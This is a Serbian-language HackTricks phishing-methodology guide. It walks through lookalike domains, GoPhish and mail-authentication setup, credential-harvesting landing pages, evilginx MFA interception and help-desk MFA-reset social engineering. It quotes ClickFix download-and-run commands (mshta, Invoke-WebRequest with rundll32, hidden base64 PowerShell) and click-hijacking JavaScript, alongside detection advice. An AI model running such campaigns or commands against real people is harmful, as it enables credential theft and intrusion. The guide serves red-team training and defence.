# Phishing metodologija

{{#include ../../banners/hacktricks-training.md}}

## Metodologija

1. Istražite žrtvu
   1. Izaberite **domen žrtve**.
   2. Obavite osnovno enumerisanje veba, **tražeći portale za prijavljivanje** koje žrtva koristi, i **odlučite** koji ćete **imitirati**.
   3. Upotrebite **OSINT** da **pronađete imejl adrese**.
2. Pripremite okruženje
   1. **Kupite domen** koji ćete koristiti za phishing procenu
   2. **Konfigurišite povezane zapise imejl servisa** (SPF, DMARC, DKIM, rDNS)
   3. Konfigurišite VPS sa **gophish**
3. Pripremite kampanju
   1. Pripremite **imejl šablon**
   2. Pripremite **veb-stranicu** za krađu akreditiva
4. Pokrenite kampanju!

## Generisanje sličnih naziva domena ili kupovina pouzdanog domena

### Tehnike variranja naziva domena

- **Ključna reč**: Naziv domena **sadrži** važnu **ključnu reč** iz originalnog domena (npr. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Poddomen sa crticom**: Zamenite **tačku crticom** u poddomenu (npr. www-zelster.com).
- **Novi TLD**: Isti domen sa **novim TLD-om** (npr. zelster.org)
- **Homoglif**: **Zamenjuje** slovo u nazivu domena **slovima koja mu liče** (npr. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Zamena mesta:** **Zamenjuje mesta dvama slovima** u nazivu domena (npr. zelsetr.com).
- **Jednina/množina**: Dodaje ili uklanja „s“ na kraju naziva domena (npr. zeltsers.com).
- **Izostavljanje**: **Uklanja jedno** od slova iz naziva domena (npr. zelser.com).
- **Ponavljanje:** **Ponavlja jedno** od slova u nazivu domena (npr. zeltsser.com).
- **Zamena**: Slično kao homoglif, ali manje prikriveno. Zamenjuje jedno od slova u nazivu domena, možda slovom koje je na tastaturi blizu originalnog slova (npr. zektser.com).
- **Umetanje poddomena**: Ubacite **tačku** unutar naziva domena (npr. ze.lster.com).
- **Umetanje**: **Ubacuje slovo** u naziv domena (npr. zerltser.com).
- **Nedostajuća tačka**: Dodajte TLD na kraj naziva domena (npr. zelstercom.com)

**Automatski alati**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Veb-sajtovi**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Menjanje bitova

Postoji **mogućnost da se neki bitovi u skladištu ili komunikaciji automatski preokrenu** zbog različitih faktora, kao što su solarne baklje, kosmički zraci ili hardverske greške.

Kada se ovaj koncept **primeni na DNS zahteve**, moguće je da **domen koji DNS server primi** nije isti kao domen koji je prvobitno zatražen.

Na primer, promena jednog bita u domenu „windows.com“ može da ga pretvori u „windnws.com“.

Napadači mogu **da iskoriste ovo tako što će registrovati više domena nastalih menjanjem bitova**, koji su slični domenu žrtve. Namera im je da preusmere legitimne korisnike na sopstvenu infrastrukturu.

Za više informacija pročitajte [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Kupovina pouzdanog domena

Možete da potražite domen kojem je istekla registracija, a koji biste mogli da koristite, na [https://www.expireddomains.net/](https://www.expireddomains.net).\
Da biste se uverili da domen kojem je istekla registracija, a koji ćete kupiti, **već ima dobar SEO**, možete da proverite kako je kategorizovan na sledećim sajtovima:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Pronalaženje imejl adresa

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% besplatno)
- [https://phonebook.cz/](https://phonebook.cz) (100% besplatno)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Da biste **pronašli još** važećih imejl adresa ili **proverili one** koje ste već pronašli, možete da proverite da li možete da ih brute-force-ujete preko SMTP servera žrtve. [Ovde saznajte kako da proverite/pronađete imejl adrese](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Takođe, ne zaboravite da, ako korisnici **koriste neki veb-portal za pristup imejlovima**, možete da proverite da li je ranjiv na **brute force korisničkih imena** i da iskoristite ranjivost ako je moguće.

## Konfigurisanje GoPhish

### Instalacija

Možete da ga preuzmete sa [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Preuzmite ga i raspakujte u `/opt/gophish`, pa pokrenite `/opt/gophish/gophish`\
U izlazu će se prikazati lozinka za administratorskog korisnika na portu 3333. Zato pristupite tom portu i upotrebite te akreditive da promenite administratorsku lozinku. Možda ćete morati da tunelujete taj port na lokalnu mašinu:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Konfiguracija

**TLS konfiguracija sertifikata**

Pre ovog koraka trebalo bi da ste **već kupili domen** koji ćete koristiti i da on **pokazuje** na **IP adresu VPS-a** na kojem konfigurišete **gophish**.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Konfiguracija pošte**

Započnite instalacijom: `apt-get install postfix`

Zatim dodajte domen u sledeće datoteke:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Promenite i vrednosti sledećih promenljivih u datoteci /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Na kraju izmenite datoteke **`/etc/hostname`** i **`/etc/mailname`** tako da sadrže ime vašeg domena i **restartujte VPS.**

Sada napravite **DNS A zapis** za `mail.<domain>` koji upućuje na **IP adresu** VPS-a i **DNS MX** zapis koji upućuje na `mail.<domain>`

Sada testirajmo slanje e-pošte:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Gophish konfiguracija**

Zaustavite izvršavanje gophish-a i konfigurišimo ga.\
Izmenite `/opt/gophish/config.json` na sledeće (obratite pažnju na upotrebu https):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**Konfigurišite gophish servis**

Da biste kreirali gophish servis koji se automatski pokreće i kojim se može upravljati kao servisom, možete da napravite datoteku `/etc/init.d/gophish` sa sledećim sadržajem:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Završite konfigurisanje servisa i proverite ga tako što ćete:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Konfigurisanje mail servera i domena

### Sačekajte i budite legitimni

Što je domen stariji, manja je verovatnoća da će biti označen kao spam. Zato bi trebalo da sačekate što je duže moguće (najmanje 1 nedelju) pre phishing procene. Štaviše, ako postavite stranicu koja se bavi reputacionim sektorom, stečena reputacija će biti bolja.

Imajte na umu da, iako morate da sačekate nedelju dana, sve možete da konfigurišete već sada.

### Konfigurisanje Reverse DNS (rDNS) zapisa

Podesite rDNS (PTR) zapis tako da se IP adresa VPS-a razrešava u ime domena.

### Sender Policy Framework (SPF) zapis

Morate **da konfigurišete SPF zapis za novi domen**. Ako ne znate šta je SPF zapis, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Možete da koristite [https://www.spfwizard.net/](https://www.spfwizard.net) za generisanje SPF pravila (koristite IP adresu VPS mašine)

![SPF Wizard obrazac za generisanje SPF zapisa za phishing domen](<../../images/image (1037).png>)

Ovaj sadržaj treba da bude postavljen u TXT zapisu domena:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Zapis za autentifikaciju, izveštavanje i usaglašenost poruka zasnovanu na domenu (DMARC)

Morate **da konfigurišete DMARC zapis za novi domen**. Ako ne znate šta je DMARC zapis, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Morate da kreirate novi DNS TXT zapis za hostname `_dmarc.<domain>` sa sledećim sadržajem:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Morate **da podesite DKIM za novi domen**. Ako ne znate šta je DKIM zapis, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Ovaj vodič je zasnovan na: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Potrebno je da spojite obe B64 vrednosti koje generiše DKIM ključ:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Proverite rezultat konfiguracije svoje e-pošte

To možete uraditi pomoću [https://www.mail-tester.com/](https://www.mail-tester.com)\
Samo posetite stranicu i pošaljite e-poruku na adresu koju vam daju:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Možete i **proveriti konfiguraciju e-pošte** tako što ćete poslati e-poštu na `check-auth@verifier.port25.com` i **pročitati odgovor** (za to ćete morati da **otvorite** port **25** i pogledate odgovor u datoteci _/var/mail/root_ ako e-poštu pošaljete kao root).\
Proverite da li ste prošli sve testove:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Možete i da pošaljete **poruku na Gmail nalog koji kontrolišete** i proverite **zaglavlja e-pošte** u prijemnom sandučetu Gmail-a; `dkim=pass` bi trebalo da bude prisutan u polju zaglavlja `Authentication-Results`.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### Uklanjanje sa Spamhouse crne liste

Stranica [www.mail-tester.com](https://www.mail-tester.com) može da vam kaže da li je vaš domen blokiran na Spamhouse-u. Možete da zatražite uklanjanje domena/IP adrese na: [https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Uklanjanje sa Microsoft crne liste

Možete da zatražite uklanjanje domena/IP adrese na [https://sender.office.com/](https://sender.office.com).

## Kreiranje i pokretanje GoPhish kampanje

### Profil za slanje

- Unesite **naziv za prepoznavanje** profila pošiljaoca
- Odlučite sa kog naloga ćete slati phishing mejlove. Predlozi: _noreply, support, servicedesk, salesforce..._
- Polja za korisničko ime i lozinku možete da ostavite prazna, ali obavezno označite opciju „Zanemari greške sertifikata“

![Kreiranje i pokretanje GoPhish kampanje - Profil za slanje: Polja za korisničko ime i lozinku možete da ostavite prazna, ali obavezno označite opciju „Zanemari greške sertifikata“](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Preporučuje se korišćenje funkcije „**Pošalji probni mejl**“ da biste proverili da li sve radi.\
> Preporučio bih da **probne mejlove šaljete na adrese 10min mail-a** da biste izbegli stavljanje na crnu listu tokom testiranja.

### Šablon mejla

- Unesite **naziv za prepoznavanje** šablona
- Zatim napišite **naslov** (neka bude nešto uobičajeno, što biste očekivali da vidite u regularnom mejlu)
- Proverite da li je označena opcija „**Dodaj sliku za praćenje**“
- Napišite **šablon mejla** (možete da koristite promenljive kao u sledećem primeru):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Imajte na umu da se **radi povećanja verodostojnosti emaila** preporučuje da upotrebite potpis iz nekog emaila klijenta. Predlozi:

- Pošaljite email na **nepostojeću adresu** i proverite da li odgovor sadrži potpis.
- Potražite **javne email adrese** kao što su info@ex.com, press@ex.com ili public@ex.com, pošaljite im email i sačekajte odgovor.
- Pokušajte da kontaktirate neku **otkrivenu važeću** email adresu i sačekajte odgovor

![Sending Profile - Email Template: Pokušajte da kontaktirate neku otkrivenu važeću email adresu i sačekajte odgovor](<../../images/image (80).png>)

> [!TIP]
> Email Template takođe omogućava da **priložite fajlove za slanje**. Ako želite i da ukradete NTLM challenges pomoću posebno napravljenih fajlova/dokumenata, [pročitajte ovu stranicu](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Odredišna stranica

- Unesite **ime**
- **Napišite HTML kod** web stranice. Imajte na umu da možete da **uveзете** web stranice.
- Označite **Capture Submitted Data** i **Capture Passwords**
- Podesite **preusmeravanje**

![Email Template - Landing Page: Označite Capture Submitted Data i Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Obično ćete morati da izmenite HTML kod stranice i da je testirate lokalno (možda koristeći neki Apache server) **dok ne budete zadovoljni rezultatom.** Zatim unesite taj HTML kod u polje.\
> Imajte na umu da, ako treba da **koristite statičke resurse** za HTML (možda neke CSS i JS stranice), možete da ih sačuvate u _**/opt/gophish/static/endpoint**_ i zatim im pristupite preko _**/static/\<filename>**_

> [!TIP]
> Za preusmeravanje možete da **preusmerite korisnike na legitimnu glavnu web stranicu** žrtve ili, na primer, na _/static/migration.html_, da prikažete **točkić za učitavanje (**[**https://loading.io/**](https://loading.io)**) tokom 5 sekundi, a zatim navedete da je proces uspešno završen**.

### Korisnici i grupe

- Unesite ime
- **Uvezite podatke** (imajte na umu da su za korišćenje šablona iz primera potrebni ime, prezime i email adresa svakog korisnika)

![Landing Page - Users & Groups: Uvezite podatke (imajte na umu da su za korišćenje šablona iz primera potrebni ime, prezime i email adresa svakog korisnika)](<../../images/image (163).png>)

### Kampanja

Na kraju, napravite kampanju tako što ćete izabrati ime, email template, landing page, URL, sending profile i grupu. Imajte na umu da će URL biti link poslat žrtvama.

Imajte na umu da **Sending Profile omogućava slanje testnog emaila kako biste videli kako će izgledati konačni phishing email**:

![Users & Groups - Campaign: Imajte na umu da Sending Profile omogućava slanje testnog emaila kako biste videli kako će izgledati konačni phishing email](<../../images/image (192).png>)

Kada sve bude spremno, pokrenite kampanju!

## Kloniranje web stranice

Ako iz bilo kog razloga želite da klonirate web stranicu, pogledajte sledeću stranicu:


{{#ref}}
clone-a-website.md
{{#endref}}

## Dokumenti i fajlovi sa backdoor-om

U nekim phishing procenama (uglavnom za Red Teams) poželećete i da **pošaljete fajlove koji sadrže neku vrstu backdoor-a** (možda C2 ili samo nešto što će pokrenuti autentifikaciju).\
Pogledajte sledeću stranicu za nekoliko primera:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Preko proxy MitM-a

Prethodni napad je prilično domišljat jer lažirate pravu web stranicu i prikupljate informacije koje unosi korisnik. Nažalost, ako korisnik ne unese ispravnu lozinku ili ako je aplikacija koju ste lažirali podešena da koristi 2FA, **ove informacije vam neće omogućiti da se predstavljate kao prevareni korisnik**.

Tu su korisni alati kao što su [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) i [**muraena**](https://github.com/muraenateam/muraena). Ovaj alat vam omogućava da izvedete napad nalik MitM-u. U osnovi, napad funkcioniše na sledeći način:

1. **Lažno predstavljate obrazac za prijavu** na pravoj web stranici.
2. Korisnik **šalje** svoje **kredencijale** vašoj lažnoj stranici, a alat ih prosleđuje pravoj web stranici i **proverava da li kredencijali funkcionišu**.
3. Ako je nalog podešen da koristi **2FA**, MitM stranica će zatražiti 2FA, a kada ga **korisnik unese**, alat će ga proslediti pravoj web stranici.
4. Kada se korisnik autentifikuje, vi ćete kao napadač **prikupiti kredencijale, 2FA, cookie i sve informacije** iz svake interakcije tokom koje alat izvodi MitM.

### Preko VNC-a

Šta ako umesto da **pošaljete žrtvu na zlonamernu stranicu** koja izgleda kao originalna, pošaljete je na **VNC sesiju sa browserom povezanim na pravu web stranicu**? Moći ćete da vidite šta radi, ukradete lozinku, korišćeni MFA, cookies...\
To možete da uradite pomoću [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Otkrivanje da ste otkriveni

Očigledno, jedan od najboljih načina da saznate da li ste provaljeni jeste da **potražite svoj domen na blacklistama**. Ako se nalazi na njima, vaš domen je nekako prepoznat kao sumnjiv.\
Jednostavan način da proverite da li se vaš domen nalazi na nekoj blacklisti jeste da upotrebite [https://malwareworld.com/](https://malwareworld.com)

Međutim, postoje i drugi načini da saznate da li žrtva **aktivno traži sumnjive phishing aktivnosti u divljini**, kao što je objašnjeno ovde:


{{#ref}}
detecting-phising.md
{{#endref}}

Možete **kupiti domen sa veoma sličnim imenom** kao domen žrtve **i/ili generisati sertifikat** za **poddomen** domena koji kontrolišete, **a koji sadrži** **ključnu reč** iz domena žrtve. Ako žrtva izvrši bilo kakvu **DNS ili HTTP interakciju** sa njima, znaćete da **aktivno traži** sumnjive domene i moraćete da budete veoma prikriveni.<sup>[[2]](#references)</sup>

### Procena phishinga

Koristite [**Phishious** ](https://github.com/Rices/Phishious)da procenite da li će vaš email završiti u spam folderu, biti blokiran ili uspešno isporučen.

## Kompromitovanje identiteta uz direktnu podršku (resetovanje MFA preko službe za podršku)

Savremene grupe za upade sve češće u potpunosti preskaču email mamce i **direktno ciljaju tok rada službe za podršku / oporavka identiteta** kako bi zaobišle MFA. Napad se u potpunosti oslanja na postojeće alate: kada operater preuzme važeće kredencijale, prelazi na druge sisteme pomoću ugrađenih administratorskih alata – malware nije potreban.<sup>[[6]](#references)</sup>

### Tok napada
1. Izviđanje žrtve
   * Prikupite lične i poslovne podatke sa LinkedIn-a, iz data breach-eva, javnog GitHub-a itd.
   * Identifikujte identitete visoke vrednosti (rukovodioce, IT, finansije) i utvrdite **tačan postupak službe za podršku** za resetovanje lozinke / MFA.
2. Društveni inženjering u realnom vremenu
   * Pozovite službu za podršku telefonom, preko Teams-a ili chata, predstavljajući se kao meta (često uz **lažirani caller ID** ili **kloniran glas**).
   * Navedite prethodno prikupljene PII podatke kako biste prošli verifikaciju zasnovanu na znanju.
   * Ubedite agenta da **resetuje MFA tajnu** ili izvrši **SIM-swap** registrovanog mobilnog broja.
3. Neposredne aktivnosti nakon pristupa (≤60 min u stvarnim slučajevima)
   * Uspostavite uporište preko bilo kog web SSO portala.
   * Izlistajte AD / AzureAD pomoću ugrađenih alata (bez postavljanja binarnih fajlova):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Lateralno kretanje pomoću **WMI**, **PsExec** ili legitimnih **RMM** agenata koji su već na listi dozvoljenih u okruženju.

### Detekcija i ublažavanje
* Tretirajte oporavak identiteta preko help-deska kao **privilegovanu operaciju** – zahtevajte dodatnu autentifikaciju i odobrenje menadžera.
* Uvedite pravila za **Identity Threat Detection & Response (ITDR)** / **UEBA** koja šalju upozorenja za:  
  * Promenjen MFA metod + autentifikacija sa novog uređaja / sa nove geografske lokacije.  
  * Neposredno podizanje privilegija istog naloga (korisnik-→-administrator).
* Snimajte pozive help-desku i zahtevajte **povratni poziv na već registrovani broj** pre bilo kakvog resetovanja.
* Implementirajte **Just-In-Time (JIT) / Privileged Access** kako nalozi kojima je upravo resetovana lozinka ne bi automatski dobijali tokene visokih privilegija.

---

## Obmana velikih razmera – SEO poisoning i kampanje „ClickFix“
Uobičajene kriminalne grupe nadoknađuju troškove operacija koje zahtevaju mnogo direktnog angažovanja masovnim napadima, pretvarajući **pretraživače i oglasne mreže u kanal za isporuku**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** gura lažni rezultat, kao što je `chromium-update[.]site`, na vrh oglasa u pretrazi.
2. Žrtva preuzima mali **loader prve faze** (često JS/HTA/ISO). Primeri koje je uočio Unit 42:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Loader eksfiltrira kolačiće pregledača + baze podataka akreditiva, a zatim preuzima **tihi loader** koji *u realnom vremenu* odlučuje da li će isporučiti:
   * RAT (npr. AsyncRAT, RustDesk)
   * ransomware / wiper
   * komponentu za održavanje prisustva (ključ Run u registru + zakazani zadatak)

### Saveti za ojačavanje bezbednosti
* Blokirajte novoregistrovane domene i primenite **Advanced DNS / URL Filtering** i na *oglase u pretrazi* i na e-poštu.
* Ograničite instalaciju softvera na potpisane MSI pakete / Store pakete, a izvršavanje `HTA`, `ISO`, `VBS` datoteka zabranite pravilima.
* Pratite podređene procese pregledača koji pokreću instalacione programe:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Potražite LOLBins koje često zloupotrebljavaju loaderi prve faze (npr. `regsvr32`, `curl`, `mshta`).

### Otmica klika na dugme za preuzimanje uz predaju TDS-u
Neki lažni softverski portali ostavljaju vidljivi `href` za preuzimanje usmeren ka **pravom** GitHub/release URL-u, ali JavaScript-om otimaju **prvu** korisničku interakciju i umesto toga preusmeravaju žrtvu u lanac Traffic Distribution System (TDS).<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Ključne karakteristike:
- Hook se obično izvršava u **capture fazi** (`true`) na objektu `document`, pa se aktivira pre handlera sajta.
- Chrome često koristi `mousedown` umesto `click` da bi preusmeravanje ostalo povezano sa važećim **korisničkim gestom** i poboljšalo zaobilaženje popup-blockera.
- Neke varijante unapred otvaraju `about:blank` ili simuliraju klikove na `<a target="_blank">`, pa tek kasnije postavljaju TDS URL.
- Ograničenja na strani browsera obično se čuvaju u `localStorage`, pa **prvi klik** može odvesti do malware-a, dok se osvežavanja/pokušaji ponovo usmeravaju na bezazleno izgledajuću vidljivu vezu.
- TDS može da filtrira prema referrer-u, domenu ulaska, GEO, otisku browsera/uređaja, VPN/datacenter proverama, kontekstu klika i brojačima po sesiji, zbog čega ponovljeni pokušaji analitičara nisu deterministički.

Ideje za odbranu:
- Uporedite prikazani `href` sa stvarnim ciljem navigacije koji se generiše u trenutku klika.
- Tražite handlere `document.addEventListener(..., true)` koji pozivaju i `preventDefault()` i `stopImmediatePropagation()` u vezi sa `window.open`, `about:blank` ili simuliranim klikovima na anchor elemente.
- Grupe nedavno registrovanih domena za preuzimanje softvera koji svi učitavaju isti CloudFront/JS stage predstavljaju snažan signal SEO trovanja/TDS obrasca.

### ClickFix sa lažnih stranica za verifikaciju + LOLBAS preuzimanja koja izgledaju kao arhive
Neke grane TDS-a završavaju na lažnoj stranici za verifikaciju (u stilu Cloudflare/IUAM) koja žrtvi nalaže da pokrene pouzdanu Windows binarnu datoteku kao što je:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Napomene:
- `mshta.exe` izvršava **HTA/VBScript na početku odgovora**, čak i ako se URL predstavlja kao `.7z` arhiva; naknadno dodati podaci arhive mogu biti samo mamac.
- Naredne faze često nastavljaju da lažno predstavljaju tip datoteke (`.rtf` za PowerShell, `.asar` za Python, ZIP arhive sa dopunjenim binarnim datotekama), a zatim prelaze na **manual PE mapping / in-memory execution**.
- Ako reagujete na jedan od ovih lanaca, sačuvajte **mrežni saobraćaj + memoriju od prvog uspešnog pokretanja**: kasnija ponavljanja mogu prikazati samo bezazlenu putanju instalera/SFX-a ili ne uspeti zato što je objavljivanje payload-a/ključa bilo vezano za originalnu TDS sesiju.

### ClickFix DLL delivery tradecraft (lažno CERT ažuriranje)
* Mamac: klonirano saopštenje nacionalnog CERT-a sa dugmetom **Update** koje prikazuje detaljna uputstva za „popravku“. Žrtvama se govori da pokrenu batch skriptu koja preuzima DLL i izvršava je pomoću `rundll32`.<sup>[[12]](#references)</sup>
* Uobičajeni uočeni batch lanac:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` smešta payload u `%TEMP%`, kratko čekanje prikriva mrežni jitter, a zatim `rundll32` poziva izvezenu ulaznu tačku (`notepad`).
* DLL šalje identitet hosta i proverava C2 svakih nekoliko minuta. Udaljeni zadaci stižu kao **base64-kodirani PowerShell**, koji se izvršava skriveno i uz zaobilaženje pravila:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Ovo čuva fleksibilnost C2 sistema (server može da menja zadatke bez ažuriranja DLL-a) i skriva prozore konzole. Potražite PowerShell procese-potomke `rundll32.exe` koji istovremeno koriste `-WindowStyle Hidden`, `FromBase64String` i `Invoke-Expression`.
* Odbrambeni timovi mogu da traže HTTP(S) callback zahteve oblika `...page.php?tynor=<COMPUTER>sss<USER>` i intervale polling-a od 5 minuta nakon učitavanja DLL-a.

---

## Malvertising pokrenut prikazom oglasa putem RTB-a

Za razliku od sponzorisanog rezultata pretrage, za koji je potreban klik, RTB oglas može da učita JavaScript treće strane kada se njegov kreativni sadržaj prikaže na veb-sajtu ili u aplikaciji. Citizen Lab je uočio da ad tag-ovi pozivaju zaseban decision server i šalju mu advertising identifiers. Većina prikaza oglasa dobila je prazan odgovor; odabrani prikazi mogli su da dobiju JavaScript. Zato bezazlen odgovor tokom ponovnog reprodukovanja ne dokazuje da su svi korisnici dobili isti sadržaj.<sup>[[14]](#references)</sup>

Ovo je **mehanizam isporuke**, a ne exploit sam po sebi: izvršavanje JavaScript-a u kontekstu prikazivanja oglasa ne instalira automatski spyware. Osnovni browser ili OS exploit nije obelodanjen, pa samo prikaz oglasa ili zahtev ka decision server-u nisu dokaz infekcije. Za povezivanje identiteta u okviru RTB targetiranja pogledajte [Modelovanje pretnji i razdvajanje identiteta](../../privacy/threat-modeling-and-identity-separation.md).<sup>[[14]](#references)</sup>

## Phishing operacije unapređene pomoću AI-ja
Napadači sada kombinuju **LLM i API-je za kloniranje glasa** kako bi kreirali potpuno personalizovane mamce i komunicirali u realnom vremenu.

| Sloj | Primer upotrebe od strane aktera pretnje |
|-------|-----------------------------|
|Automatizacija|Generisanje i slanje više od 100 hiljada e-poruka/SMS poruka sa nasumično variranim formulacijama i tracking linkovima.|
|Generativni AI|Kreiranje *jedinstvenih* e-poruka koje pominju javno poznate M&A događaje i interne šale sa društvenih mreža; deepfake glasa direktora u callback prevari.|
